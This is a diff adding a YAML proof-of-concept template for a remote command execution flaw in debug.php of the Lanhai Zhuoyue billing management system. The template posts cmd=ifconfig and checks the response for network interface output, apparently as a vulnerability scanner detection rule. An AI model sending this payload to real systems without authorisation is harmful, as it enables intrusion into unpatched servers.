@@ -1,0 +1,17 @@
+id: poc-yaml-lanhai-zy-management-system-remote-command-execution
+info:
+  name: 蓝海卓越计费管理系统 debug.php 远程命令执行漏洞
+  severity: high
+  tags:
+  - rce
+  finger: PHP
+requests:
+- method: POST
+  path: /debug.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+  data: cmd=ifconfig
+  expression: status_code == 200 && contains(body,"BROADCAST") && contains(body,"MULTICAST")
+    && contains(body,"addr") && content_type == "text/html"
+variables: {}
+transport: http
